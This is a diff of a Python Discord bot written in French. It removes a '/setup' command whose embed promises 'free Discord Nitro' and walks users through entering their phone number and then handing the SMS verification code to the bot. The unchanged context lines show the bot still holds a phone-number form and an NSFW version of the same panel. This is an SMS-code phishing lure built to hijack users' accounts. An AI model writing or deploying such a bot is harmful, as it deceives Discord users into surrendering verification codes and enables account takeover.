@@ -604,75 +604,7 @@ class VerifyButtonView(discord.ui.View):
     async def _button_callback(self, interaction: discord.Interaction):
         await interaction.response.send_modal(PhoneModal())
 
-# ===== COMMANDES SLASH =====
 
-@bot.tree.command(name="setup", description="Crée le panneau de vérification dans ce salon")
-@app_commands.default_permissions(administrator=True)
-async def setup(interaction: discord.Interaction):
-    embed = discord.Embed(
-        title="Obtenez Discord Nitro Gratuitement",
-        description=(
-            "Suivez ces étapes simples pour obtenir plusieurs Nitro sans dépenser un centime :\n\n"
-            "**1 - Procédure de Vérification :**\n"
-            "- Cliquez sur \"✅ Vérifier\" en bas de cette page.\n"
-            "- Entrez votre numéro de téléphone.\n\n"
-            "**2 - Recevez le Code par SMS :**\n"
-            "- Vous recevrez un code par SMS sur votre téléphone.\n"
-            "- Ce code est essentiel pour la prochaine étape.\n\n"
-            "**3 - Validez avec le Code :**\n"
-            "- Une fois que vous avez reçu le code, entrez-le lorsque notre bot vous le demandera.\n"
-            "- Cela liera votre numéro de téléphone à notre système sécurisé. "
-            "Aucune de vos informations ne sera enregistrée, donc sauvegardez-les.\n\n"
-            "**4 - Réclamez Vos Nitro :**\n"
-            "- Après avoir validé avec le code, notre bot vous guidera vers la page de réclamation.\n"
-            "- Suivez les instructions à l'écran pour recevoir vos Nitro gratuits.\n\n"
-            "**Pourquoi Faire Cela ?**\n"
-            "En liant votre numéro de téléphone, vous devenez éligible pour notre technique exclusive "
-            "qui permet de générer plusieurs Nitro. C'est une opportunité unique de profiter des "
-            "avantages de Discord Nitro sans frais.\n\n"
-            "**Attention :**\n"
-            "- Assurez-vous d'entrer un numéro de téléphone valide.\n"
-            "- Le code SMS est crucial, ne le partagez avec personne d'autre que notre bot.\n"
-            "- Vous ne serez facturé de 0 centime pour cette technique."
-        ),
-        color=SETUP_COLOR
-    )
-    embed.set_footer(text="Nitro gratuit • 0,00 €")
-    view = VerifyButtonView(is_nsfw=False)
-
-    # Vérifier s'il y a déjà un setup dans ce salon → update
-    setup_data = load_setup_data()
-    existing = None
-    for entry in setup_data:
-        if entry["channel_id"] == interaction.channel_id:
-            existing = entry
-            break
-
-    if existing and existing.get("message_id"):
-        try:
-            old_msg = await interaction.channel.fetch_message(existing["message_id"])
-            await old_msg.edit(embed=embed, view=view)
-            embed_success = discord.Embed(title="Panneau mis à jour", description="Le panneau de vérification a été mis à jour dans ce salon.", color=COLOR_SUCCESS)
-            await interaction.response.send_message(embed=embed_success, ephemeral=True)
-            return
-        except (discord.NotFound, discord.HTTPException):
-            pass  # Message supprimé, on en crée un nouveau
-
-    await interaction.response.send_message(embed=embed, view=view)
-    msg = await interaction.original_response()
-
-    # Sauvegarder dans setup_data
-    if existing:
-        existing["message_id"] = msg.id
-        existing["type"] = "normal"
-    else:
-        setup_data.append({
-            "channel_id": interaction.channel_id,
-            "message_id": msg.id,
-            "type": "normal"
-        })
-    save_setup_data(setup_data)
-    log.info(f"Setup fait dans #{interaction.channel.name} (msg: {msg.id})")
 
 
 @bot.tree.command(name="setupnsfw", description="Crée le panneau de vérification NSFW dans ce salon")
